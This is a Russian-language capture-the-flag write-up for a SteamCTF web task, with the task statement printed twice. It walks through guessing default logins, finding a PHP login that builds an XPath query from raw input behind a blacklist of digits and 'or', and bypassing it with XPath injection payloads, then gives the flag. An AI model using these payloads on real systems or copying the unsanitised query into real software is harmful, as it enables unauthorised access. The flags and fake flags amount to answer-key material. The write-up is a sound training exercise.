# SteamCTF

## Условие

> **Записки охранника Игоря:** _день первый_
>
> Во всей моей профессиональной практике я не находил более ответственного, ленивого,но прилежного сисадмина, чем этот новичок. Он мне сразу не понравился. Ну даже мне понятно, что от рута в консоли не надо работать!! Я вот сижу под своим **Игорь** и всем доволен! Вообще в нашем банке есть особенная система, специально, чтобы не вести таблицу доходов/расходов, но попробуй объясни это новичку...
> В этой системе обращение к элементам **документа**, имеющего древовидную структуру, напоминает взаимодействие с файловой системой **(/)**.
> Всем удобно, никто не жалуется.
> Эту [систему](http://ваш_сайт:1001) создал старый сисадмин Павлик, но его выгнали, из-за этого он ушёл и даже не сказал пароль!!!
> Знаю только, что он фанат Warface. Ээх..поиграть бы..
> Но для начала надо найти пароль, вдруг он его куда-нибудь записал...> **Записки охранника Игоря:** _день первый_
>
> Во всей моей профессиональной практике я не находил более ответственного, ленивого,но прилежного сисадмина, чем этот новичок. Он мне сразу не понравился. Ну даже мне понятно, что от рута в консоли не надо работать!! Я вот сижу под своим **Игорь** и всем доволен! Вообще в нашем банке есть особенная система, специально, чтобы не вести таблицу доходов/расходов, но попробуй объясни это новичку...
> В этой системе обращение к элементам **документа**, имеющего древовидную структуру, напоминает взаимодействие с файловой системой **(/)**.
> Всем удобно, никто не жалуется.
> Эту [систему](http://ваш_сайт:1001) создал старый сисадмин Павлик, но его выгнали, из-за этого он ушёл и даже не сказал пароль!!!
> Знаю только, что он фанат Warface. Ээх..поиграть бы..
> Но для начала надо найти пароль, вдруг он его куда-нибудь записал...

## Решение

> Самое сложное и важное -- прочитать условие.
> Понимаем, что повествование переключилось, теперь идет не от лица горе-сисадмина, а от лица охранника Игоря. Выделено имя -- на
> заметку, скорее всего надо будет ломать именно его.
> Система, похожая чем-то на БД из прошлых соревнований первого дня.
> Ладно, переходим на сайт, пробуем авторизоваться как `admin`:`admin`, на что сайт выкидывает: `Ваш флаг STEAMCTF: flag{4dm1N_is_4n_Inv4LiD_usEr}`.
> Можно подумать, что все, вот он флаг, только он почему-то не сдается в чекер, а если присмотреться, можно прочитать `admin is an invalid user`.
> Понятно. Швыряем ботинок в сторону автора таска, надо попробовать что-нибудь другое.
> Спойлер! Так же все нижеперечисленные фейкофлаги неверные! Это на случай любителей сканеров `=)`
>
> ```
> user:user
> lol_try_harder!!!
>
> test:test
> flag{t3st_is_4n_Inv4LiD_usEr}
>
> admin:admin
> flag{4dm1N_is_4n_Inv4LiD_usEr}
>
> root:root
> flag{r007_is_4n_Inv4LiD_usEr}
>
> ubuntu:ubuntu
> flag{uBUN7u_is_4n_Inv4LiD_usEr}
>
> kali:kali
> flag{k4L1_is_4n_Inv4LiD_usEr}
>
> lol:lol
> flag{l0l_is_4n_Inv4LiD_usEr}
>
> secret:secret
> flag{my_53CR37_U53R_is_4n_Inv4LiD_usEr}
>
> server:server
> flag{th15_15_NOT_4_U53R}
>
> flag:flag
> flag{th15_15_NOT_4_U53R}
> ```
>
> Возвращаемся к описанию.
> Документ,имеющий древовидную структуру намекает на **XML документ** и **XPath (XML Path Language)**.
>
> По аналогии с первым вебом на прошлых соревнованиях можно предположить, что тут тоже инъекция, тем более такая есть, а автор
> намекает на это.
>
> Гуглим [туц](https://raz0r.name/articles/vvedenie-v-xpath-inekcii/) и [туц](https://xakep.ru/2008/06/24/44160/)
> Можно сразу было попробовать вставить кавычку и понять, что это была `xpath inj`:
>
> ```
>
> Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/html/index.php on line 561
>
>
> Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/html/index.php on line 561
>
> ```
>
> `'1'='1` и аналогичные кавычки не работают, также блочатся `or` и цифры.
>
> Зайдя в исходный код страницы, ищем комментарии по `<!-`, находим ссылку
> `<!-- <a href="/index.php/src/">Look_here</a> -->` на исходный код.
>
> Видим, что пользовательский ввод через поля **login** и **password** фильтруется:
>
> ```php
>
> $blacklist = Array('or','0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
>
> ```
>
> Также, наюблюдаем очень странную проверку верности введённых пользователем данных:
>
> ```
>         if ($_SERVER['REQUEST_METHOD'] === 'POST'){
>
>           $login = $_POST['login'];
>
>           $pass = $_POST['pass'];
>
>           if(contains($pass, $blacklist) or contains($login, $blacklist)){
>
>               die("Простите, тут запрещено хекать!!");
>
>           }
>
>           else{
>
>             $xml = simplexml_load_file('/users.xml');
>
>
>
>             $query = "//users/user[login/text()='$login' and password/text()='$pass']";
>
>
>
>             $result = $xml->xpath($query);
>
>             if(!$result){
>
>                 echo "Попробуй еще раз! Я верю в тебя!";
>
>             }
>
>             else{
>
>                 $user_data = $xml->xpath("//users/user[login/text()='$login']")[0];
>
>                 $flag = $user_data->flag;
>
>                 echo "Ваш флаг STEAMCTF: ".$flag;
>
>             }
>
>           }
>
>         }
>
> ```
>
> Видим, что нам нужно провести инъекцию в поле **password** так, чтобы запрос был верным и выдал хотя бы один результат, а в поле
> **login** ввести необходимого нам пользователя (из описания задания можно понять, что нам необходим **Игорь**).
>
> Учитывая фильтры, простейшие инъекции:
>
> ```
>
> '] | //* | /foo[bar='
>
> '] | /* | /foo[bar='
>
> '] | /users/user | /foo[bar='
>
> ```
>
> При этом последний вариант можно вставить только в логин.
>
> **Флаг:**
> flag{xp4tH_I5_jU5T_4_w4rM_uP}
